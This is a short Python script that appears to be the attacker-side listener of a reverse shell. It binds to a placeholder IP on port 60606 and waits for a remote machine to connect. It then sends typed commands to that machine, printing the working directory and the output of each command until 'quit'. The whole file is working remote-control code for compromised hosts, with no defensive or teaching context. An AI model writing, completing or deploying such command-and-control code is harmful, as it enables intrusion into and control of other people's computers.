import socket

IP = 'YOUR_IP_HERE'
PORT = 60606

s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.bind((IP, PORT))
s1.listen()
print("[listening on] %s:%s" %(IP, str(PORT)))
conn1, addr1 = s1.accept()
print("[connection established] from "+addr1[0]+":"+str(addr1[1]))

while True:
    #get path
    conn1.send(str(len("cd".encode())).encode())        #send "cd" length
    conn1.send("cd".encode())                           #send "cd" command
    path_len=int(conn1.recv(64).decode())               #receive path length
    path=conn1.recv(path_len).decode()                  #receive path
    #input command
    cmd=(input(path.strip()+">"))
    #handle empty command
    if len(cmd) == 0:
        continue
    conn1.send(str(len(cmd.encode())).encode())         #send command length
    conn1.send(cmd.encode())                            #send command
    #handle 'quit' command
    if cmd == "quit":
        break
    #handle normal commands
    reply_len=int(conn1.recv(64).decode())              #receive reply length
    reply=conn1.recv(reply_len).decode()                #receive reply
    print(reply)

print("connection closed")
conn1.close()
s1.close()
